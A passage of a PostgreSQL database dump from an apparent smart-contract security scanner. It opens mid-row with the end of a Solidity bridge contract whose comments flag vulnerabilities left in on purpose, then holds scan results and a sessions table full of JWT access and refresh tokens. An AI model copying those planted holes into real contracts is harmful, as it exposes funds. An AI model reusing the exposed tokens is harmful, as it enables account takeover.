from signature\n     */\n    function recoverSigner(bytes32 messageHash, bytes memory signature) public pure returns (address) {\n        require(signature.length == 65, "Invalid signature length");\n\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly {\n            r := mload(add(signature, 32))\n            s := mload(add(signature, 64))\n            v := byte(0, mload(add(signature, 96)))\n        }\n\n        return ecrecover(messageHash, v, r, s);\n    }\n\n    /**\n     * @dev Pause contract - VULNERABLE to admin abuse\n     */\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /**\n     * @dev Unpause contract\n     */\n    function unpause() external onlyOwner {\n        _unpause();\n    }\n\n    /**\n     * @dev Get validator count\n     */\n    function getValidatorCount() external view returns (uint256) {\n        return validatorsList.length;\n    }\n\n    /**\n     * @dev Check if chain is supported\n     */\n    function isChainSupported(uint256 chainId) external view returns (bool) {\n        return supportedChains[chainId];\n    }\n\n    // VULNERABILITY: Fallback function accepts Ether without validation\n    receive() external payable {\n        // Could be exploited for unexpected ETH handling\n    }\n\n    // VULNERABILITY: Fallback allows arbitrary calls\n    fallback() external payable {\n        // Dangerous fallback that could be exploited\n    }\n}	\N	331	f	\N	1	0	solidity	0.8.20	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-18 01:17:03.080231+00	2025-10-18 01:28:05.06418+00
\.


--
-- Data for Name: project_contracts; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.project_contracts (project_id, contract_id, added_at) FROM stdin;
\.


--
-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.projects (id, name, description, user_id, settings, default_scan_profile, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: saved_searches; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.saved_searches (id, user_id, name, description, search_params, last_executed_at, execution_count, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: scans; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.scans (id, contract_id, user_id, scan_type, status, started_at, completed_at, error_message, critical_count, high_count, medium_count, low_count, created_at, updated_at, scanners_used, scan_config, duration_seconds) FROM stdin;
5461ec78-43f7-4a30-86cf-f120b6473196	86f9a16f-7896-4115-b321-adf9db382682	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-16 22:15:57.032901+00	2025-10-16 22:16:09.790802+00	\N	0	1	0	1	2025-10-16 22:15:51.755661+00	2025-10-16 22:15:59.040916+00	\N	{}	\N
b0e9ac5e-bc8a-441f-933c-4e8782683e66	4557d54f-bc37-4e82-819f-32a9a5137315	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	completed	2025-10-17 21:31:32.035208+00	2025-10-17 21:31:34.265536+00	\N	1	1	0	0	2025-10-17 21:31:31.976695+00	2025-10-17 21:31:34.262851+00	\N	{}	\N
9d566dd4-a057-43b4-adc4-ed7051a4900b	86f9a16f-7896-4115-b321-adf9db382682	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-16 22:16:27.014627+00	2025-10-16 22:16:33.345636+00	\N	0	1	0	1	2025-10-16 22:16:19.702025+00	2025-10-16 22:16:27.023053+00	\N	{}	\N
4afaea04-0764-468c-ad64-5c63075fcdf7	e29b1d07-26aa-4f45-bee2-83040bf5745e	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	completed	2025-10-17 21:34:16.391603+00	2025-10-17 21:34:18.513164+00	\N	0	0	0	0	2025-10-17 21:34:16.322417+00	2025-10-17 21:34:18.509924+00	\N	{}	\N
9cda5db3-28e4-48ba-96bd-796c7330ddb0	af250661-1a6a-4989-985b-7e73b6e8f306	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	quick	completed	2025-10-17 14:52:02.07158+00	2025-10-17 14:52:06.390122+00	\N	0	0	0	0	2025-10-17 14:52:01.743648+00	2025-10-17 14:52:06.322439+00	\N	{}	\N
31742a9d-5f1d-42a7-819a-c873870d252d	fc783138-6c5a-4dce-b469-9fdf46020f14	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	quick	completed	2025-10-17 01:05:22.929408+00	2025-10-17 01:05:29.942907+00	\N	1	0	0	0	2025-10-17 01:05:21.774975+00	2025-10-17 01:05:29.925867+00	\N	{}	\N
ad9f0969-beda-485f-bbaa-6d854cbb86da	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:17:21.046574+00	2025-10-17 17:17:23.942096+00	\N	1	0	0	0	2025-10-17 17:17:20.829621+00	2025-10-17 17:17:23.865724+00	\N	{}	\N
92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	completed	2025-10-17 22:29:52.114898+00	2025-10-17 22:29:56.092418+00	\N	2	5	0	0	2025-10-17 22:29:52.055946+00	2025-10-17 22:29:56.089651+00	\N	{}	\N
ab38ce7e-f785-4195-9cbc-f5005a03a531	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:25:01.166373+00	2025-10-17 17:25:03.781531+00	\N	1	0	0	0	2025-10-17 17:25:01.005552+00	2025-10-17 17:25:03.770008+00	\N	{}	\N
0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	completed	2025-10-17 21:35:49.302711+00	2025-10-17 21:35:51.466537+00	\N	8	0	0	0	2025-10-17 21:35:49.249883+00	2025-10-17 21:35:51.463832+00	\N	{}	\N
f259704f-3393-4ef6-88c7-f59a4f41c586	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:27:06.548836+00	2025-10-17 17:27:08.906687+00	\N	1	0	0	0	2025-10-17 17:27:06.335847+00	2025-10-17 17:27:08.823072+00	\N	{}	\N
1546015b-d5f5-4e9e-9d76-ecc8d082d88e	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:30:36.036971+00	2025-10-17 17:30:38.45146+00	\N	1	0	0	0	2025-10-17 17:30:35.977529+00	2025-10-17 17:30:38.370197+00	\N	{}	\N
0ffcad6c-ac72-4278-9ae3-e846d397530a	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:34:52.763623+00	2025-10-17 17:34:55.267228+00	\N	1	0	0	0	2025-10-17 17:34:52.700317+00	2025-10-17 17:34:55.189274+00	\N	{}	\N
69d0cba1-0371-4113-a759-094c89f33309	48fe8623-d7fb-40a3-90a9-1ee1ee96fd89	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	full	failed	2025-10-18 01:26:52.070711+00	2025-10-18 01:28:06.888911+00	\N	0	0	0	0	2025-10-18 01:26:51.85201+00	2025-10-18 01:28:06.885837+00	\N	{}	\N
8c5f9f99-0634-4833-890e-3f3aae0ef221	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:48:17.930506+00	2025-10-17 17:48:20.316247+00	\N	1	0	0	0	2025-10-17 17:48:17.79318+00	2025-10-17 17:48:20.311103+00	\N	{}	\N
5d741b89-e602-4862-9bda-4eea5acf333f	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 17:52:33.470605+00	2025-10-17 17:52:35.962065+00	\N	1	0	0	0	2025-10-17 17:52:33.404319+00	2025-10-17 17:52:35.868994+00	\N	{}	\N
9e06c8f8-30e1-4b62-8332-3bb8da5068a4	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	full	completed	2025-10-17 17:55:25.844726+00	2025-10-17 17:55:28.257024+00	\N	1	0	0	0	2025-10-17 17:55:25.780684+00	2025-10-17 17:55:28.153663+00	\N	{}	\N
e6d541e1-65d3-4072-9263-7b3714135fe0	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	full	completed	2025-10-17 17:58:21.506933+00	2025-10-17 17:58:24.088072+00	\N	1	0	0	0	2025-10-17 17:58:21.323057+00	2025-10-17 17:58:24.084041+00	\N	{}	\N
0300d842-455a-4102-9fa0-684e5e5d53fa	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	full	completed	2025-10-17 18:03:15.928644+00	2025-10-17 18:03:18.313844+00	\N	1	0	0	0	2025-10-17 18:03:15.864809+00	2025-10-17 18:03:18.311543+00	\N	{}	\N
77b7e537-a626-4e5a-9697-9bfdd8b64551	fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	full	completed	2025-10-17 18:21:38.655773+00	2025-10-17 18:21:41.486228+00	\N	1	0	0	0	2025-10-17 18:21:38.395867+00	2025-10-17 18:21:41.482781+00	\N	{}	\N
50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	completed	2025-10-17 19:10:36.933722+00	2025-10-17 19:10:39.244371+00	\N	4	1	0	0	2025-10-17 19:10:36.873817+00	2025-10-17 19:10:39.241762+00	\N	{}	\N
67b31138-1bd4-4422-bfdb-564f441ce01d	43195d13-0923-4e91-9008-cb6ccd854b66	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	completed	2025-10-17 21:15:13.961079+00	2025-10-17 21:15:16.153194+00	\N	1	0	0	0	2025-10-17 21:15:13.729764+00	2025-10-17 21:15:16.150978+00	\N	{}	\N
2b1f4884-513c-4176-a8b4-fa0dc33b7ee6	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	failed	2025-10-17 21:36:11.511046+00	2025-10-17 22:27:23.926727+00	\N	0	0	0	0	2025-10-17 21:36:11.464533+00	2025-10-17 22:27:23.915411+00	\N	{}	\N
f8facdd2-ad72-4757-adc0-1178e4ef6427	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	full	failed	2025-10-17 22:22:35.814973+00	2025-10-17 22:27:24.089206+00	\N	0	0	0	0	2025-10-17 22:22:35.678748+00	2025-10-17 22:27:24.086766+00	\N	{}	\N
d27fe555-06b6-47b1-bf8f-d7b28b9a1779	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	full	completed	2025-10-17 22:27:26.129635+00	2025-10-17 22:27:30.240142+00	\N	0	4	0	0	2025-10-17 22:27:26.059152+00	2025-10-17 22:27:30.237187+00	\N	{}	\N
4008c00b-763b-4c37-b11e-f94b0582eca6	39ff6067-d614-4017-8c01-896029a2729a	ab45210a-44a1-490e-bd5f-18135cdc3c91	quick	failed	2025-10-18 01:13:29.781193+00	2025-10-18 01:25:06.494985+00	\N	0	0	0	0	2025-10-18 01:13:29.171614+00	2025-10-18 01:25:06.492541+00	\N	{}	\N
94ec0b8a-869f-43c6-91f3-f2784c06e2d3	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	quick	failed	2025-10-17 21:52:31.611464+00	2025-10-18 01:25:06.586557+00	\N	0	0	0	0	2025-10-17 21:52:31.541615+00	2025-10-18 01:25:06.584068+00	\N	{}	\N
dcf88f86-7f8a-4fc8-afa7-e1574b423a08	48fe8623-d7fb-40a3-90a9-1ee1ee96fd89	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	full	failed	2025-10-18 01:18:43.914869+00	2025-10-18 01:25:06.671692+00	\N	0	0	0	0	2025-10-18 01:18:43.852333+00	2025-10-18 01:25:06.668571+00	\N	{}	\N
f4b89c5b-d294-4978-af9c-aff35aaa88d1	48fe8623-d7fb-40a3-90a9-1ee1ee96fd89	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	full	failed	2025-10-18 01:17:21.463358+00	2025-10-18 01:25:06.764141+00	\N	0	0	0	0	2025-10-18 01:17:21.395035+00	2025-10-18 01:25:06.761352+00	\N	{}	\N
\.


--
-- Data for Name: sessions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.sessions (id, user_id, token, refresh_token, expires_at, created_at, is_revoked) FROM stdin;
72f41138-aecf-4ff4-bab4-491597e3d17b	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NjIxMzcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.SQSB5sUDM4ScfS4YVPly8hR8RLI3PJR1z_hh0qO8B0Y	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNTYxMzcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.PF6L2z5XwEGf0rFBoyP5YWm-JkqsyLV6hk_X8xXxLoc	2025-10-23 21:48:57.353249+00	2025-10-16 21:48:57.229258+00	f
29d9bdb6-93f8-4f4c-a7ea-34222c880d2a	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NjIxNzEsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.3pFOFpuHw6jdkoS_SqScz1DsjeLnyBOqSRT9K6xK8LA	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNTYxNzEsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.4_0s_YdfG3JIIptW0ocAXW9fdrRJ2NS2VqkwwLh8WAw	2025-10-23 21:49:31.497391+00	2025-10-16 21:49:31.407814+00	f
1adff8f2-c653-4116-912e-d234abc78866	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NjI2MjcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.7pmQwO9jVnXrswsydqe4hGVHkfKh9BIuEGGg57inVVs	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNTY2MjcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.hMrZeE4S-5QdC9Dbk1MPV4qFDA3iBaVAOiDYwiJQ8Ew	2025-10-23 21:57:07.33299+00	2025-10-16 21:57:07.296584+00	f
48c6442b-7f28-404c-a3a4-d1cd9df47014	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2Njg0MTAsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.w16YmQuHFrf4lt6izKB0I6BYhZOhQ8_qpJwZyLaaLFE	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNjI0MTAsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.h6-XKd_GSp0Tow_6K8s0Ss4OkkQOdqF05TnmKhxkSUw	2025-10-23 23:33:30.633071+00	2025-10-16 23:33:30.450018+00	f
36966a67-e055-40af-a642-c2bcecc6cf05	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NzA4MDUsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.hsxp6cIqxiLRLbRp__V8D0tyvI1_ajxwROZcCu84T5Y	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNjQ4MDUsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.eaPfXB_HFY1O0SYoE5-3tyM9oP8Mbukm2JVEv0Jh2XA	2025-10-24 00:13:25.816421+00	2025-10-17 00:13:25.72136+00	f
a95a09fa-d152-4972-9e10-cde011c6b67d	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NzMzODcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.Qkka05VtRBThjQ2fBM93qNrvg2OeygoK0eN5wUvs8dc	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNjczODcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.LvzHVix6MM1Ihzw5VLZbnS5gsw4pLS1X5ewc0VsXh_M	2025-10-24 00:56:27.556005+00	2025-10-17 00:56:27.457837+00	f
a93e2fc2-dd6e-440c-a0fc-c46f17f92460	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NzMzOTYsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.fMQ3BRVkBNWV2YmGxfJylKJ1HzWR5J9_w39IumlN7nc	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNjczOTYsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.Dx1Q_9Ent8jusEKSi2VGWD9GuFzBYs5mIiP_0lTyDRc	2025-10-24 00:56:36.561823+00	2025-10-17 00:56:36.525821+00	f
48f285fc-e873-4aa2-9c8d-a8020b19956c	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NzYyNTIsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.zUuhKJcTzr1NqClBHaIL8Z0XiQtKSq4Hwss7xIyu3pU	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNzAyNTIsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.VmhoVonADHQTtDqP1EiG8p9IVZqX6Ik84vhtK-XQWjQ	2025-10-24 01:44:12.339018+00	2025-10-17 01:44:12.291875+00	f
c37d4d9a-8ead-4bb6-946f-e91243948ad9	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA2NzY5MzQsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.zMhg0o4tTaZ00tdOxEoJ7RmfQL7FylWCva1mIMfVbrg	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEyNzA5MzQsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0._HyljtzvPRHQZgeiwuwT1DMo__Js92IhQ0x6nBBIe6U	2025-10-24 01:55:34.960109+00	2025-10-17 01:55:34.660605+00	f
d92b1925-62ed-46b2-a723-7c3cc2497b03	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3MjM0MDMsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJhY2Nlc3MifQ.F5rPe5TXT5uTpPuut6ZbGyXGGRAWsqZ43aFyJqe3lWo	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMTc0MDMsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJyZWZyZXNoIn0.tveeL8qtdAmVPF1W-1ogtzAXVzgM24QpsrqW5-qhXTQ	2025-10-24 14:50:03.900627+00	2025-10-17 14:50:03.722194+00	f
59e90ab7-d852-4d43-bd13-0367cabda003	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3MjM0MTAsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJhY2Nlc3MifQ.x-DBASzO3-5fPFiMjCHGgoBGQHUrc1kv1Svwb82czTw	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMTc0MTEsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJyZWZyZXNoIn0.Jyzyl-gCq-Ct8p6FA1PCq3xTy2IOm8deOKc11PCUcXc	2025-10-24 14:50:11.069346+00	2025-10-17 14:50:10.873843+00	f
04fb83ff-d7e5-41bc-9e98-fd1f089f5248	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3MjM0MTgsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJhY2Nlc3MifQ.bETULvPZ1_A1AFaCm-WU7RlO5cDDmDA5QsoKSTv1g2o	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMTc0MTgsInN1YiI6IjI3ODUwODcxLTFjZDQtNDgwNC05YzFkLTZjZjhmYjkwZmJkMiIsInR5cGUiOiJyZWZyZXNoIn0.9mGEdhp49ioe1xior0HMFQZrDIUgc9C5-BL2Soii2gY	2025-10-24 14:50:18.091112+00	2025-10-17 14:50:17.982241+00	f
351d108c-f392-4dc3-ab43-b357b4e77c35	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3MzQzMTcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.RuQ-FZsRw65kvRdU5CLzOne8YeMI38_aQtnn_n8rIV8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMjgzMTcsInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.GqZWF8KitaFsK04pBdLJcgLOukhI4N6yOcr3uM9vPcs	2025-10-24 17:51:57.480432+00	2025-10-17 17:51:57.438259+00	f
1b218cd1-a6cb-448d-adcf-b40e06f44a18	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NDQ2NTksInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJhY2Nlc3MifQ.ezgJzuFCJAchumgK5NVNOY8ZsQvqu-RutzkQtSec4U8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMzg2NTksInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJyZWZyZXNoIn0._1vwq54rrppM8UM7sVgybGJTutrRBwds6e5bPM6I7XM	2025-10-24 20:44:19.339058+00	2025-10-17 20:44:19.232032+00	f
6e37da25-3d64-47d4-9386-09dcb6202179	ab45210a-44a1-490e-bd5f-18135cdc3c91	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NTk3OTksInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJhY2Nlc3MifQ.qCPrMJ7cl77MzuEAkf0FCud0tVbRZb2ee2DhVqrLx60	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzNTM3OTksInN1YiI6ImFiNDUyMTBhLTQ0YTEtNDkwZS1iZDVmLTE4MTM1Y2RjM2M5MSIsInR5cGUiOiJyZWZyZXNoIn0.5GNMrshdTm85o4E1UK8Is8rpthl_ffyIoZUCq3dEEAk	2025-10-25 00:56:39.406211+00	2025-10-17 01:56:12.593743+00	f
678d4c53-58b1-4dc9-b393-efc164e4ac75	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NDQ2NjYsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJhY2Nlc3MifQ.9gkmJMTQnnnp8yFjRB8ZjveuPFu96fWQQIAZ4RGRTlU	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMzg2NjYsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJyZWZyZXNoIn0.RdHHo2HqKxnbMmPwQBEFIjxPP-sz_2VChQgcAOE8rxc	2025-10-24 20:44:26.793551+00	2025-10-17 20:44:26.750765+00	f
9fa28072-62a1-4f22-9ea4-da46eb5bf674	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NDUwNDksInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJhY2Nlc3MifQ.I-yMr4VptdOm6rxVpZFx1lU12RHCy_lk3o1JG5Appyg	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMzkwNDksInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJyZWZyZXNoIn0.zSWyrkVcqT4q2AVDw-gxzhmk9Gjj_JKCbTYcjdKmSYA	2025-10-24 20:50:49.7321+00	2025-10-17 20:50:49.688881+00	f
d9dda68d-7e1a-4235-acfe-cc2f4ad6e3f7	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NDUxNDgsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJhY2Nlc3MifQ.1M0Y3h2x8rGjajmQDj8ON2n_5Iz0Xg-OOm477HN3PeE	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzMzkxNDgsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJyZWZyZXNoIn0.8F6sjICVW9Dp-IQc_ncat98vjlgHDZXJXfqON086Lxc	2025-10-24 20:52:28.366319+00	2025-10-17 20:52:28.331369+00	f
